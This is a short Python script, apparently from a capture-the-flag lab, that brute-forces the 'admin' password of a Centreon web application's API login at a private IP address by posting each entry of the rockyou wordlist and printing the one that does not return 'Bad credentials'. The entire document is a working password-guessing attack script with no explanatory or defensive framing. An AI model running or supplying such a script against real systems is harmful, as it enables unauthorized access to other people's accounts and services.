import requests

url = "http://10.10.10.157/centreon/api/index.php?action=authenticate"
passwords = "/root/rockyou.txt"
pws = [line.strip('\n') for line in open(passwords)]

for pw in pws:
    data = {'username':'admin', 'password':pw}
    out = requests.post(url, data=data).text
    if "Bad credentials" not in out:
        print "[*] Password found: %s" % pw
